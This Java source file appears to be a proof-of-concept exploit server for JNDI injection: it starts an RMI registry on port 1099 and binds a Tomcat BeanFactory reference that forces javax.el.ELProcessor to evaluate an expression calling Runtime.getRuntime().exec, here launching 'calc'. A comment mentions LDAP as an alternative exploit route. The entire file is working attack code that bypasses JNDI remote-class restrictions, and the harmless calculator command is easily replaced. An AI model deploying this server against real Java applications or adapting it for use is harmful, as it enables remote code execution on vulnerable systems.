package Server;

import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class LoadTomcatLocalClassServer {
    public static void main(String[] args) throws Exception{
        // Using RMI way, actually LDAP  is also a good exploit way
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String) null, "", "", true, "org.apache.naming.factory.BeanFactory", (String) null);
        resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
        resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));

        initialContext.bind("rmi://localhost:1099/TomcatBypass", resourceRef);
        System.out.println("RMIServer start...");
    }
}
